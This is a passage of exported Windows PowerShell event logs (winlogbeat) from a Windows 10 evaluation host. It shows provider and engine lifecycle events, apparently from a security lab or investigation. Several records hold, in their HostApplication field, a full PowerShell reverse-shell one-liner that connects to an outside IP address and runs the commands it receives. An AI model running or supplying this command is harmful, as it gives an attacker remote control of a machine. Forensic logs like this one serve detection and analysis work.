	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4626,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.951",hnkbBIQByII7dpeEdzNe,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:19.890","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4627,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.951",h3kbBIQByII7dpeEdzNe,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:19.890","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4628,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.951",iHkbBIQByII7dpeEdzNe,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:19.890","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4629,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.951",iXkbBIQByII7dpeEdzNe,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:19.890","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ebfa8c85-e2b0-44f2-918c-b588a32c3077
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4630,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.209",g3kbBIQByII7dpeEczNY,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:10:18.856","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=1dd2fe6d-e183-4f78-a4ba-2ad6f9631d81
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=1dd2fe6d-e183-4f78-a4ba-2ad6f9631d81
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4624,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.163",f3kbBIQByII7dpeEczNY,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:18.856","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4620,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.163",gHkbBIQByII7dpeEczNY,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:18.856","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4621,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.163",gXkbBIQByII7dpeEczNY,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:18.856","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4622,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.163",gnkbBIQByII7dpeEczNY,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:18.856","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4623,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.116",fXkbBIQByII7dpeEczNY,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:18.856","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4618,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:10:18.116",fnkbBIQByII7dpeEczNY,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:10:18.856","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=ee4fc429-c805-41fe-b509-c0be88d744b8
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4619,"Provider Lifecycle","-","-","-","-","-"
